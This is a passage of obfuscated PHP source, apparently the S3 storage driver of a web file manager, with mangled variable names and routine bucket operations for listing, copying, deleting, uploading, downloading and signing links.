$ñ•ÅÊ±[186], 600); del_file($Œ³˜üã£); return $ñ•ÅÊ±[195] . $˜ô‰ÈÓ . $ñ•ÅÊ±[73]; } public function fileOutImageServer($ã¾úé—ˆ, $Š¯ïÒš = 250) { $this->fileOutImage($ã¾úé—ˆ, $Š¯ïÒš); } public function fileNameAuto($²¨ÂŒ•, $íÑñ¾Ç, $¿·´‚íû = REPEAT_RENAME, $ÈÉšÀ’ò = false) { $àùÉôŠ— =& $_SERVER[ •ŒÓîÆ]; $œ½×Í¡° = $²¨ÂŒ• === $àùÉôŠ—[12] ? $íÑñ¾Ç : rtrim($²¨ÂŒ•, $àùÉôŠ—[8]) . $àùÉôŠ—[8] . $íÑñ¾Ç; if ($¿·´‚íû == REPEAT_REPLACE || !$this->exist($œ½×Í¡°) || $ÈÉšÀ’ò && $¿·´‚íû != REPEAT_RENAME_FOLDER) { return $íÑñ¾Ç; } if ($¿·´‚íû == REPEAT_SKIP) { return !1; } $»òôŸ˜ = $àùÉôŠ—[10] . get_path_ext($íÑñ¾Ç); $»òôŸ˜ = $»òôŸ˜ == $àùÉôŠ—[10] || $ÈÉšÀ’ò ? $àùÉôŠ—[12] : $»òôŸ˜; $±Åƒ­ÉŞ = 1; $²å ·…ó = substr($íÑñ¾Ç, 0, strlen($íÑñ¾Ç) - strlen($»òôŸ˜)); $Ô§­¡ø¥ = $²å ·…ó . "\50{$±Åƒ­ÉŞ}\51{$»òôŸ˜}"; while ($this->exist(rtrim($²¨ÂŒ•, $àùÉôŠ—[8]) . $àùÉôŠ—[8] . $Ô§­¡ø¥)) { $Ô§­¡ø¥ = $²å ·…ó . "\x28{$±Åƒ­ÉŞ}\x29{$»òôŸ˜}"; $±Åƒ­ÉŞ++; } return $Ô§­¡ø¥; } private function fileNameAutoList($´¿Şéâä, $°ç¡é†Æ, $©ú¾Ãä = false) { $›—½ä =& $_SERVER[ •ŒÓîÆ]; $«¾Èö‚ = $this->listPath($´¿Şéâä, !0); $«¾Èö‚ = array_merge($«¾Èö‚[$›—½ä[84]], $«¾Èö‚[$›—½ä[85]]); $Õ±Ş›ô° = array_to_keyvalue($«¾Èö‚, $›—½ä[12], $›—½ä[32]); $ùè„Ú×Õ = $›—½ä[10] . get_path_ext($°ç¡é†Æ); $ùè„Ú×Õ = $ùè„Ú×Õ == $›—½ä[10] || $©ú¾Ãä ? $›—½ä[12] : $ùè„Ú×Õ; $àÅÔù÷ = substr($°ç¡é†Æ, 0, strlen($°ç¡é†Æ) - strlen($ùè„Ú×Õ)); $ã²É‘ŸÑ = $àÅÔù÷ . "\x28\60\x29{$ùè„Ú×Õ}"; for ($ç¯¨ ‚ø = 1; $ç¯¨ ‚ø <= count($Õ±Ş›ô°) + 1; $ç¯¨ ‚ø++) { $ã²É‘ŸÑ = $àÅÔù÷ . "\50{$ç¯¨ ‚ø}\x29{$ùè„Ú×Õ}"; if (!in_array_not_case($ã²É‘ŸÑ, $Õ±Ş›ô°)) { return $ã²É‘ŸÑ; } } return $ã²É‘ŸÑ; } public function listAllFiles($´ìŒ°šâ, $Õ±‡ÆÎ†) { $Íúß»‹ =& $_SERVER[ •ŒÓîÆ]; if (empty($Õ±‡ÆÎ†)) { return array(); } $°µÑ‹— = array_keys($Õ±‡ÆÎ†); $É¼µĞ€¹ = array(); $´ìŒ°šâ = trim($´ìŒ°šâ, $Íúß»‹[8]); foreach ($Õ±‡ÆÎ† as $Ê‚‹’Ù† => $¾Ã€ğ) { $ÅØ©šç° = ltrim(substr(trim($Ê‚‹’Ù†, $Íúß»‹[8]), strlen($´ìŒ°šâ)), $Íúß»‹[8]); if (substr($Ê‚‹’Ù†, -1) == $Íúß»‹[8]) { $ÅØ©šç° = rtrim($ÅØ©šç°, $Íúß»‹[8]) . $Íúß»‹[8]; } $É¼µĞ€¹ = array_merge($É¼µĞ€¹, $this->slicePath($ÅØ©šç°)); } $¶Óä¡¥ñ = array(); foreach (array_unique($É¼µĞ€¹) as $†”Ìéı—) { $§ª±Æ„… = array($Íúß»‹[86] => $this->getPathOuter($Íúß»‹[8] . $´ìŒ°šâ . $Íúß»‹[8] . $†”Ìéı—), $Íúß»‹[77] => 1, $Íúß»‹[78] => 0); if (substr($†”Ìéı—, -1) != $Íúß»‹[8]) { $§ª±Æ„…[$Íúß»‹[77]] = 0; $°¼Ñ™´ = $this->getPath($´ìŒ°šâ . $Íúß»‹[8] . $†”Ìéı—); if (isset($Õ±‡ÆÎ†[$°¼Ñ™´])) { $ŸÉë¾—ñ = $Õ±‡ÆÎ†[$°¼Ñ™´]; if (isset($ŸÉë¾—ñ[$Íúß»‹[78]])) { $§ª±Æ„…[$Íúß»‹[78]] = intval($ŸÉë¾—ñ[$Íúß»‹[78]]); } if (isset($ŸÉë¾—ñ[$Íúß»‹[196]])) { $§ª±Æ„…[$Íúß»‹[87]] = intval($ŸÉë¾—ñ[$Íúß»‹[196]]); } } } $¶Óä¡¥ñ[] = $§ª±Æ„…; } return $¶Óä¡¥ñ; } public function slicePath($®®¼›Ì­) { $Â¢’§Ôº =& $_SERVER[ •ŒÓîÆ]; $ ‰«…‰ = explode($Â¢’§Ôº[8], trim($®®¼›Ì­, $Â¢’§Ôº[8])); $„Å‡ş˜ë = 0; do { ++$„Å‡ş˜ë; $ïÛÈŠÕÕ[] = implode($Â¢’§Ôº[8], array_slice($ ‰«…‰, 0, $„Å‡ş˜ë)) . $Â¢’§Ôº[8]; } while ($„Å‡ş˜ë < count($ ‰«…‰)); $ïÛÈŠÕÕ[count($ ‰«…‰) - 1] = $®®¼›Ì­; return $ïÛÈŠÕÕ; } public function getHost() { $úşù²ê× =& $_SERVER[ •ŒÓîÆ]; $»Â”ùÚµ = parse_url(trim($this->domain, $úşù²ê×[8])); $ƒÚŒ¤şÂ = isset($»Â”ùÚµ[$úşù²ê×[197]]) ? $»Â”ùÚµ[$úşù²ê×[197]] : http_type(); $Ñ«Õòé = isset($»Â”ùÚµ[$úşù²ê×[198]]) ? $»Â”ùÚµ[$úşù²ê×[198]] : $»Â”ùÚµ[$úşù²ê×[86]]; if (isset($»Â”ùÚµ[$úşù²ê×[199]])) { $Ñ«Õòé .= $úşù²ê×[4] . $»Â”ùÚµ[$úşù²ê×[199]]; } return $ƒÚŒ¤şÂ . $úşù²ê×[200] . $Ñ«Õòé; } public function pathEncode($ß¢ëâ‚) { $ÍşÚóÑí =& $_SERVER[ •ŒÓîÆ]; return str_replace($ÍşÚóÑí[201], $ÍşÚóÑí[8], rawurlencode($ß¢ëâ‚)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($£¿Ëğ¶è) { set_timeout(); require_once SDK_DIR . $_SERVER[ •ŒÓîÆ][202]; parent::__construct(); $this->_init($£¿Ëğ¶è); } public function _init($œ·Ê–±Ú) { $this->config = $œ·Ê–±Ú; foreach ($œ·Ê–±Ú as $ò–³Ì—÷ => $©æõîøÍ) { if (isset($this->{$ò–³Ì—÷})) { $this->{$ò–³Ì—÷} = $©æõîøÍ; } } $this->endpoint = $œ·Ê–±Ú[$_SERVER[ •ŒÓîÆ][203]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($¢–À¾ÜÈ = "\x76\64") { $this->signVer = $¢–À¾ÜÈ; $this->client->setSignatureVersion($¢–À¾ÜÈ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $¶Òå™Ñ =& $_SERVER[ •ŒÓîÆ]; $Àü†é‰© = $this->getBucketCors(); if (!$Àü†é‰© || !is_array($Àü†é‰©)) { return !1; } if ($Àü†é‰©[$¶Òå™Ñ[204]] != $¶Òå™Ñ[205] || $Àü†é‰©[$¶Òå™Ñ[206]] != $¶Òå™Ñ[205]) { return !1; } $ˆº­‚êï = array_map($¶Òå™Ñ[207], $Àü†é‰©[$¶Òå™Ñ[208]]); if (!is_array($ˆº­‚êï)) { $ˆº­‚êï = array(); } $º¦Ç”ı = array($¶Òå™Ñ[209], $¶Òå™Ñ[210], $¶Òå™Ñ[211], $¶Òå™Ñ[212], $¶Òå™Ñ[213]); $’õ©¨åß = array_diff($º¦Ç”ı, $ˆº­‚êï); return empty($’õ©¨åß); } public function mkfile($ÕË—ñîÂ, $Æëù®” = '', $Î¼÷óÏÍ = REPEAT_RENAME) { $ôÔçšÏ­ = $this->setContent($ÕË—ñîÂ, $Æëù®”); if ($ôÔçšÏ­ !== !1) { return $this->getPathOuter($ÕË—ñîÂ); } return !1; } public function mkdir($ÕÑÕ­—², $‚°ü¨ = REPEAT_SKIP) { $†œéïàè =& $_SERVER[ •ŒÓîÆ]; if (empty($ÕÑÕ­—²) && $ÕÑÕ­—² !== $†œéïàè[214]) { return !1; } if ($‚°ü¨ && $this->_isFolder($ÕÑÕ­—²)) { return $this->getPathOuter($ÕÑÕ­—²); } $°ûÑ¥‹ = $this->setContent($ÕÑÕ­—², $†œéïàè[12], !0); if ($°ûÑ¥‹ !== !1) { return $this->getPathOuter($ÕÑÕ­—²); } return !1; } public function copyFile($Ú…‰Î’Ã, $˜å¬ê œ, $¨ÊÎ›àç = array()) { $ó†ëÈÍ× =& $_SERVER[ •ŒÓîÆ]; $ãÂôŸØ“ = $this->objectMeta($Ú…‰Î’Ã); if (!$ãÂôŸØ“) { return !1; } if ($ãÂôŸØ“[$ó†ëÈÍ×[78]] <= 1024 * 1024 * 200) { $ÛÍŠ‰€Ô = $this->client->copyObject($this->bucket, $Ú…‰Î’Ã, $this->bucket, $˜å¬ê œ, $ó†ëÈÍ×[215], $¨ÊÎ›àç); } else { $ÛÍŠ‰€Ô = $this->client->multiCopyObject($this->bucket, $Ú…‰Î’Ã, $this->bucket, $˜å¬ê œ, $¨ÊÎ›àç); } $ÛÍŠ‰€Ô = $ÛÍŠ‰€Ô ? $this->getPathOuter($˜å¬ê œ) : !1; return $ÛÍŠ‰€Ô; } public function moveFile($¼——Öˆ€, $…‚×Šßä) { if ($this->copyFile($¼——Öˆ€, $…‚×Šßä)) { $this->delFile($¼——Öˆ€); return $this->getPathOuter($…‚×Šßä); } return !1; } public function delFile($™üô—ÈÓ) { return $this->client->deleteObject($this->bucket, $™üô—ÈÓ); } public function delFolder($Ÿ¥ †˜‰) { $õ–§ÖÂ† =& $_SERVER[ •ŒÓîÆ]; if (!$this->exist($Ÿ¥ †˜‰)) { return !0; } $this->listItemCache = !1; $†¸Ûíï¤ = $this->fileList($Ÿ¥ †˜‰); $this->listItemCache = !0; $Êó¾§ˆ = trim($Ÿ¥ †˜‰, $õ–§ÖÂ†[8]) . $õ–§ÖÂ†[8]; if (!empty($Ÿ¥ †˜‰) && $Ÿ¥ †˜‰ !== $õ–§ÖÂ†[214] && !in_array($Êó¾§ˆ, $†¸Ûíï¤[$õ–§ÖÂ†[84]])) { $†¸Ûíï¤[$õ–§ÖÂ†[84]][] = $Êó¾§ˆ; } $Şòõª†£ = $this->delByBatch($†¸Ûíï¤[$õ–§ÖÂ†[85]]); if (!$Şòõª†£) { return !1; } $Şòõª†£ = $this->delByBatch($†¸Ûíï¤[$õ–§ÖÂ†[84]]); if (!$Şòõª†£) { return !1; } return $this->delFile($Êó¾§ˆ); } private function delByBatch($ÌÒ¼‘¬½) { foreach (array_chunk($ÌÒ¼‘¬½, 1000) as $‚›°ÍõÖ) { $Ó±ßÁá´ = $this->client->deleteObjects($this->bucket, $‚›°ÍõÖ); if (!$Ó±ßÁá´) { return !1; } } return !0; } public function rename($š×µâ“‹, $‡Çš¶Ã) { return $this->renameObject($š×µâ“‹, $‡Çš¶Ã); } public function listPath($É¤­Ö€é, $ç¬ùıÅŞ = false) { $ÓŒÎ‚† =& $_SERVER[ •ŒÓîÆ]; $äÀñ¶– = $this->fileList($É¤­Ö€é, $ÓŒÎ‚†[8], !0); foreach ($äÀñ¶–[$ÓŒÎ‚†[84]] as $å¨¿ÙÑô => $…öµ…Æ) { $äÀñ¶–[$ÓŒÎ‚†[84]][$å¨¿ÙÑô] = $this->folderInfo($…öµ…Æ, $ç¬ùıÅŞ, $…öµ…Æ); } foreach ($äÀñ¶–[$ÓŒÎ‚†[85]] as $å¨¿ÙÑô => $…öµ…Æ) { $äÀñ¶–[$ÓŒÎ‚†[85]][$å¨¿ÙÑô] = $this->fileInfo($…öµ…Æ[$ÓŒÎ‚†[32]], $ç¬ùıÅŞ, $…öµ…Æ); } return $äÀñ¶–; } protected function infoChildren($‡Ñİì‘Æ, &$›©Ùôåı) { $°²Á±ïí =& $_SERVER[ •ŒÓîÆ]; $òÇìøá = $this->fileList($‡Ñİì‘Æ, $°²Á±ïí[12], !0); $›©Ùôåı[$°²Á±ïí[80]] += count($òÇìøá[$°²Á±ïí[84]]); $›©Ùôåı[$°²Á±ïí[79]] += count($òÇìøá[$°²Á±ïí[85]]); foreach ($òÇìøá[$°²Á±ïí[85]] as $à¬˜£ù’) { if (!$à¬˜£ù’ || !$à¬˜£ù’[$°²Á±ïí[78]]) { continue; } $›©Ùôåı[$°²Á±ïí[78]] += $à¬˜£ù’[$°²Á±ïí[78]]; } } private function fileInfo($ÆñğŠï§, $–™üÎ = false, $Ùˆü™ñŠ = array()) { $ˆÍî±¡ =& $_SERVER[ •ŒÓîÆ]; $¾êêíŸ = array($ˆÍî±¡[32] => $this->pathThis($ÆñğŠï§), $ˆÍî±¡[86] => $this->getPathOuter($ÆñğŠï§), $ˆÍî±¡[33] => $ˆÍî±¡[216], $ˆÍî±¡[177] => $this->ext($ÆñğŠï§), $ˆÍî±¡[78] => isset($Ùˆü™ñŠ[$ˆÍî±¡[78]]) ? $Ùˆü™ñŠ[$ˆÍî±¡[78]] : 0); if ($–™üÎ) { return $¾êêíŸ; } $¾êêíŸ[$ˆÍî±¡[217]] = $¾êêíŸ[$ˆÍî±¡[87]] = 0; $¾êêíŸ[$ˆÍî±¡[218]] = $¾êêíŸ[$ˆÍî±¡[219]] = !0; if (empty($Ùˆü™ñŠ)) { $Ùˆü™ñŠ = $this->objectMeta($ÆñğŠï§); if (!$Ùˆü™ñŠ) { return $¾êêíŸ; } } if (isset($Ùˆü™ñŠ[$ˆÍî±¡[220]]) && $Ùˆü™ñŠ[$ˆÍî±¡[220]]) { $¾êêíŸ[$ˆÍî±¡[221]] = $Ùˆü™ñŠ[$ˆÍî±¡[220]]; } if (isset($Ùˆü™ñŠ[$ˆÍî±¡[196]])) { $¾êêíŸ[$ˆÍî±¡[87]] = $Ùˆü™ñŠ[$ˆÍî±¡[196]]; } if (isset($Ùˆü™ñŠ[$ˆÍî±¡[78]])) { $¾êêíŸ[$ˆÍî±¡[78]] = $Ùˆü™ñŠ[$ˆÍî±¡[78]]; } return $¾êêíŸ; } private function folderInfo($ú˜¾‰­È, $›ƒ£øÁØ = false, $ˆ…şæÃ = array()) { $øöúÍË¯ =& $_SERVER[ •ŒÓîÆ]; $‡³Ş”ˆ† = array($øöúÍË¯[32] => $this->pathThis($ú˜¾‰­È), $øöúÍË¯[86] => $this->getPathOuter($øöúÍË¯[8] . $ú˜¾‰­È), $øöúÍË¯[33] => $øöúÍË¯[77]); if ($›ƒ£øÁØ) { return $‡³Ş”ˆ†; } $‡³Ş”ˆ†[$øöúÍË¯[217]] = $‡³Ş”ˆ†[$øöúÍË¯[87]] = 0; $‡³Ş”ˆ†[$øöúÍË¯[218]] = $‡³Ş”ˆ†[$øöúÍË¯[219]] = !0; if ($ú˜¾‰­È == $øöúÍË¯[12]) { return $‡³Ş”ˆ†; } if (empty($ˆ…şæÃ)) { $ˆ…şæÃ = $this->objectMeta(trim($ú˜¾‰­È, $øöúÍË¯[8]) . $øöúÍË¯[8]); } if (isset($ˆ…şæÃ[$øöúÍË¯[196]])) { $‡³Ş”ˆ†[$øöúÍË¯[217]] = $ˆ…şæÃ[$øöúÍË¯[196]]; } return $‡³Ş”ˆ†; } private function fileList($óêˆ¿²Ê, $èÍùø×à = '', $Ñò×â¿‹ = 0) { $…¤ÍûÑß =& $_SERVER[ •ŒÓîÆ]; $½æİ®â× = rtrim($óêˆ¿²Ê, $…¤ÍûÑß[8]) . $…¤ÍûÑß[8]; $Â§ƒ—É’ = $this->listObjs($½æİ®â×, null, null, $èÍùø×à); if (!$Â§ƒ—É’) { return array($…¤ÍûÑß[84] => array(), $…¤ÍûÑß[85] => array()); } $®–Ùù‘™ = $¸¹À‹Š = array(); foreach ($Â§ƒ—É’[$…¤ÍûÑß[222]] as $µáû½˜ß) { $’ÕæğÏ• = $µáû½˜ß[$…¤ÍûÑß[32]]; if ($’ÕæğÏ• == $½æİ®â×) { continue; } $°ˆøµŒ = isset($µáû½˜ß[$…¤ÍûÑß[78]]) ? $µáû½˜ß[$…¤ÍûÑß[78]] : 0; $‚Îø¥€Ø = $°ˆøµŒ == 0 && substr($’ÕæğÏ•, strlen($’ÕæğÏ•) - 1, 1) == $…¤ÍûÑß[8] ? !0 : !1; $this->cacheMethodInfoSet($’ÕæğÏ•, $‚Îø¥€Ø, $µáû½˜ß); if ($‚Îø¥€Ø) { $®–Ùù‘™[] = $’ÕæğÏ•; continue; } $¸¹À‹Š[] = $Ñò×â¿‹ ? $µáû½˜ß : $’ÕæğÏ•; } foreach ($Â§ƒ—É’[$…¤ÍûÑß[223]] as $µáû½˜ß) { $®–Ùù‘™[] = $µáû½˜ß[$…¤ÍûÑß[32]]; $this->cacheMethodInfoSet($µáû½˜ß[$…¤ÍûÑß[32]], !0); } $this->cacheMethodInfoSet($óêˆ¿²Ê, !0); return array($…¤ÍûÑß[84] => $®–Ùù‘™, $…¤ÍûÑß[85] => $¸¹À‹Š); } private function listObjs($¸Ø¼¯°, $½Ë„õ–‰ = null, $ø©ïù©´ = null, $ò¬ª¡ğ½ = null) { $Ñ€É˜¤ß =& $_SERVER[ •ŒÓîÆ]; $¸Ø¼¯° = trim($¸Ø¼¯°, $Ñ€É˜¤ß[8]); $Ÿöèşƒ = empty($¸Ø¼¯°) && $¸Ø¼¯° !== $Ñ€É˜¤ß[214] ? $Ñ€É˜¤ß[12] : $¸Ø¼¯° . $Ñ€É˜¤ß[8]; return $this->client->getBucket($this->bucket, $Ÿöèşƒ, $½Ë„õ–‰, $ø©ïù©´, $ò¬ª¡ğ½, !0); } public function has($äĞ™¼ö, $í÷ï‘™§ = false, $‘µßŒ— = true) { $œñÜÈÔÕ =& $_SERVER[ •ŒÓîÆ]; $äĞ™¼ö = trim($äĞ™¼ö, $œñÜÈÔÕ[8]); $ìƒŠ¥ = empty($äĞ™¼ö) && $äĞ™¼ö !== $œñÜÈÔÕ[214] ? $œñÜÈÔÕ[12] : $äĞ™¼ö . $œñÜÈÔÕ[8]; $ñÍÆì¼Ì = null; $ó’ùçõ× = 500; $¸©Öğãï = $œñÜÈÔÕ[8]; $ÍÌ‹­ = $–š‚Ôá… = array(); while (!0) { $“¾Óæ‘ú = $this->listObjs($äĞ™¼ö, $ñÍÆì¼Ì, $ó’ùçõ×, $¸©Öğãï); if (!$“¾Óæ‘ú) { break; } $ñÍÆì¼Ì = $“¾Óæ‘ú[$œñÜÈÔÕ[224]]; $ë‚âïÄˆ = $“¾Óæ‘ú[$œñÜÈÔÕ[222]]; $ŸœğĞ± = $“¾Óæ‘ú[$œñÜÈÔÕ[223]]; if (empty($ë‚âïÄˆ) && empty($ŸœğĞ±)) { break; } if (count($ë‚âïÄˆ) == 1 && $ë‚âïÄˆ[0][$œñÜÈÔÕ[32]] == $ìƒŠ¥) { break; } if ($í÷ï‘™§) { if (count($ë‚âïÄˆ)) { $ë‚âïÄˆ = array_column($ë‚âïÄˆ, $œñÜÈÔÕ[32]); $ÍÌ‹­ = array_merge($ÍÌ‹­, $ë‚âïÄˆ); } if (count($ŸœğĞ±)) { $ŸœğĞ± = array_column($ŸœğĞ±, $œñÜÈÔÕ[32]); $–š‚Ôá… = array_merge($–š‚Ôá…, $ŸœğĞ±); } if ($ñÍÆì¼Ì === null) { break; } continue; } if ($‘µßŒ—) { if (!empty($ë‚âïÄˆ)) { if (count($ë‚âïÄˆ) > 1 || isset($ë‚âïÄˆ[0][$œñÜÈÔÕ[32]]) && $ë‚âïÄˆ[0][$œñÜÈÔÕ[32]] != $ìƒŠ¥) { return !0; } } } else { if (!empty($ŸœğĞ±)) { return !0; } } if ($ñÍÆì¼Ì === null) { break; } } if ($í÷ï‘™§) { $ÍÌ‹­ = array_diff($ÍÌ‹­, array($ìƒŠ¥)); $ÍÌ‹­ = count(array_unique($ÍÌ‹­)); $–š‚Ôá… = count(array_unique($–š‚Ôá…)); return array($œñÜÈÔÕ[225] => $ÍÌ‹­, $œñÜÈÔÕ[226] => $–š‚Ôá…); } return !1; } public function listAll($Ş¾€¨Íğ) { $åë£¢çƒ =& $_SERVER[ •ŒÓîÆ]; $´œáŒÍ = $this->fileList($Ş¾€¨Íğ, $åë£¢çƒ[12], !0); $Ö’¢‘æ = array_to_keyvalue($´œáŒÍ[$åë£¢çƒ[85]], $åë£¢çƒ[32]); foreach ($´œáŒÍ[$åë£¢çƒ[84]] as $ù¼‡±¥«) { if (is_string($ù¼‡±¥«)) { $Ö’¢‘æ[$ù¼‡±¥«] = array($åë£¢çƒ[78] => 0); } } return $this->listAllFiles($Ş¾€¨Íğ, $Ö’¢‘æ); } public function canRead($ ×¿Ìõ) { $®øÚ¦« =& $_SERVER[ •ŒÓîÆ]; $‘’È¶éŞ = $this->client->getAccessControlPolicy($this->bucket, $ ×¿Ìõ); if (!$‘’È¶éŞ) { return !1; } return in_array($‘’È¶éŞ, array($®øÚ¦«[227], $®øÚ¦«[228], $®øÚ¦«[229])) ? !0 : !1; } public function canWrite($Ôƒ‚½‹‘) { $™ì”âƒ =& $_SERVER[ •ŒÓîÆ]; $¼²—Ü’ç = $this->client->getAccessControlPolicy($this->bucket, $Ôƒ‚½‹‘); if (!$¼²—Ü’ç) { return !1; } return in_array($¼²—Ü’ç, array($™ì”âƒ[227], $™ì”âƒ[228])) ? !0 : !1; } public function getContent($“Ó”ÈìÀ) { return $this->client->getObject($this->bucket, $“Ó”ÈìÀ); } public function setContent($¶©¢Şï¥, $æ‹…Øì› = '', $Œ…Ä¤äò = false) { $Áîª”û¡ =& $_SERVER[ •ŒÓîÆ]; $¶©¢Şï¥ = $Œ…Ä¤äò ? trim($¶©¢Şï¥, $Áîª”û¡[8]) . $Áîª”û¡[8] : $¶©¢Şï¥; $«€­Ã…± = get_file_mime(get_path_ext($¶©¢Şï¥)); $Â†ˆÑ»ä = $this->client->putObject($æ‹…Øì›, $this->bucket, $¶©¢Şï¥, $Áîª”û¡[215], array(), $«€­Ã…±); if (!$Â†ˆÑ»ä) { return !1; } if ($Œ…Ä¤äò) { return !0; } $this->cacheMethod(null, null); $Â†ˆÑ»ä = $this->copyFile($¶©¢Şï¥, $¶©¢Şï¥, array($Áîª”û¡[230] => $Â†ˆÑ»ä[$Áîª”û¡[220]])); return $Â†ˆÑ»ä ? !0 : !1; } public function fileSubstr($€…Ôğï“, $ì­Å„áé, $è¼›•ÏŠ) { $É§ÕÆ† = $ì­Å„áé + $è¼›•ÏŠ - 1; return $this->client->getObject($this->bucket, $€…Ôğï“, array($_SERVER[ •ŒÓîÆ][231] => "\142\171\164\x65\x73\75{$ì­Å„áé}\55{$É§ÕÆ†}")); } public function upload($£‹½ø®®, $èÓàï‡ğ, $Ù¢£ş×Š = false, $ˆ©“¬¹™ = REPEAT_REPLACE) { $®ÂÚÛÏ• =& $_SERVER[ •ŒÓîÆ]; $ñŞıã‘Ò = array($®ÂÚÛÏ•[230] => @md5_file($èÓàï‡ğ)); $®ÁõÕ¼„ = array($®ÂÚÛÏ•[232] => get_file_mime(get_path_ext($£‹½ø®®))); if (IO::size($èÓàï‡ğ) <= 1024 * 1024 * 200) { $²çÆß¿ó = $this->client->putObjectFile($èÓàï‡ğ, $this->bucket, $£‹½ø®®, $®ÂÚÛÏ•[215], $ñŞıã‘Ò, $®ÁõÕ¼„); return !empty($²çÆß¿ó) ? $this->getPathOuter($£‹½ø®®) : !1; } $Ö¤ÒãüÊ = $this->client->multiUploadObject($èÓàï‡ğ, $this->bucket, trim($£‹½ø®®, $®ÂÚÛÏ•[8]), $ñŞıã‘Ò, $®ÁõÕ¼„); return $Ö¤ÒãüÊ ? $this->getPathOuter($£‹½ø®®) : !1; } public function download($·Éìµû, $ØÂéì×å) { if (!@is_dir($this->pathFather($ØÂéì×å)) && !IO::mkdir($this->pathFather($ØÂéì×å))) { return !1; } $ïšÛ‚úõ = $this->client->getObject($this->bucket, $·Éìµû, array(), $ØÂéì×å); return $ïšÛ‚úõ !== !1 ? $ØÂéì×å : !1; } public function link($Ûª¡²‚º, $‚›‡Àí¶ = array()) { $û™œÃŞ’ =& $_SERVER[ •ŒÓîÆ]; if ($this->signVer == $û™œÃŞ’[233]) { return $this->client->getAuthenticatedURL($this->bucket, $Ûª¡²‚º, 3600 * 12, $‚›‡Àí¶); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($Ûª¡²‚º, $û™œÃŞ’[8]), 3600 * 12, $this->region, array(), !0, $‚›‡Àí¶); } public function fileOut($·©«°», $ı¿‡Â = false, $è¹Í–ê„ = false, $ËÍØºÈª = '') { $áûª˜ßã =& $_SERVER[ •ŒÓîÆ]; if ($this->isFileOutServer()) { return $this->fileOutServer($·©«°», $ı¿‡Â, $è¹Í–ê„, $ËÍØºÈª); } if (!$è¹Í–ê„) { $è¹Í–ê„ = $this->pathThis($·©«°»); } $Ë¦ÒìÆ = get_file_mime(get_path_ext($è¹Í–ê„)); if ($Ë¦ÒìÆ == $áûª˜ßã[234]) { return parent::fileOut($·©«°», $ı¿‡Â, $è¹Í–ê„, $ËÍØºÈª); } $Æğ«ˆà = array($áûª˜ßã[235] => $Ë¦ÒìÆ); if ($ı¿‡Â) { $Æğ«ˆà[$áûª˜ßã[236]] = $áûª˜ßã[237] . rawurlencode($è¹Í–ê„); } else { } $¿‹å¥´Ì = $this->link($·©«°», $Æğ«ˆà); $this->fileOutLink($¿‹å¥´Ì); } public function fileOutServer($á®û†ŠÓ, $±¼í¬ú = false, $ñúùÎ§ = false, $Ô¿ëĞÇ = '') { parent::fileOut($á®û†ŠÓ, $±¼í¬ú, $ñúùÎ§, $Ô¿ëĞÇ); } public function fileOutImageServer($ÙÁ¸ı¸’, $ş„•–Ï‚ = 250) { parent::fileOutImage($ÙÁ¸ı¸’, $ş„•–Ï‚); } public function hashMd5($°îÏæªè, $¬ºñŸ÷ = '') { $¥©ôÆƒò =& $_SERVER[ •ŒÓîÆ]; $‚›Šæ§Ç = $this->objectMeta($°îÏæªè); if (!$‚›Šæ§Ç) { return !1; } $¬ºñŸ÷ = $¬ºñŸ÷ ? $¬ºñŸ÷ : _get($‚›Šæ§Ç, $¥©ôÆƒò[238]); $¬ºñŸ÷ = $¬ºñŸ÷ ? $¬ºñŸ÷ : _get($‚›Šæ§Ç, $¥©ôÆƒò[220], $¥©ôÆƒò[12]); return $¬ºñŸ÷; } public function uploadFormData($ïÂ‹Øğû, $ä‡§üä = 3600) { $ğ±§õÊã =& $_SERVER[ •ŒÓîÆ]; $¤Ñ³ËÇÌ = $this->pathFather($ïÂ‹Øğû); $Ö½š£†¼ = $this->client->getHttpUploadPostParams($this->bucket, $¤Ñ³ËÇÌ, $ğ±§õÊã[215], $ä‡§üä); return array_merge((array) $Ö½š£†¼, array($ğ±§õÊã[198] => $this->getHost())); } public function multiUploadFormData($î¯Áçœ•, $õ¸ÒéŒø = 3600) { $´˜üëÊ± =& $_SERVER[ •ŒÓîÆ]; $¼ê¸öã¯ = gmdate($´˜üëÊ±[239]); $¡›¸“¸µ = array(); $—Ğ¶ÌŞ = $this->client->getUploadId($this->bucket, $î¯Áçœ•, $¡›¸“¸µ); if (!$—Ğ¶ÌŞ) { return !1; } return array($´˜üëÊ±[240] => $—Ğ¶ÌŞ, $´˜üëÊ±[198] => $this->getHost() . $´˜üëÊ±[8] . $this->pathEncode($î¯Áçœ•), $´˜üëÊ±[241] => $¼ê¸öã¯, $´˜üëÊ±[96] => $î¯Áçœ•); } public function multiUploadAuthData($˜éËÑß¡, $‰ü¤¬‡Ï = array()) { $¥ÜÛğ†É =& $_SERVER[ •ŒÓîÆ]; $¬®€…Ô¬ = isset($‰ü¤¬‡Ï[$¥ÜÛğ†É[241]]) ? $‰ü¤¬‡Ï[$¥ÜÛğ†É[241]] : gmdate($¥ÜÛğ†É[239]); $øÆà¹Ïš = isset($‰ü¤¬‡Ï[$¥ÜÛğ†É[177]]) ? $‰ü¤¬‡Ï[$¥ÜÛğ†É[177]] : $¥ÜÛğ†É[12]; $‰Ïû’…µ = $‰ü¤¬‡Ï[$¥ÜÛğ†É[96]]; unset($‰ü¤¬‡Ï[$¥ÜÛğ†É[96]]); if (isset($‰ü¤¬‡Ï[$¥ÜÛğ†É[242]])) { $‰ü¤¬‡Ï[$¥ÜÛğ†É[241]] = $¬®€…Ô¬; return $this->listUploadParts($‰Ïû’…µ, $‰ü¤¬‡Ï); } $“şÖïõ» = array($¥ÜÛğ†É[243], $¥ÜÛğ†É[12], $¥ÜÛğ†É[122], $¥ÜÛğ†É[12], "\170\55\x61\155\x7a\x2d\144\141\x74\145\x3a{$¬®€…Ô¬}", $¥ÜÛğ†É[8] . $this->bucket . $¥ÜÛğ†É[8] . $this->pathEncode($‰Ïû’…µ) . $øÆà¹Ïš); if (strpos($øÆà¹Ïš, 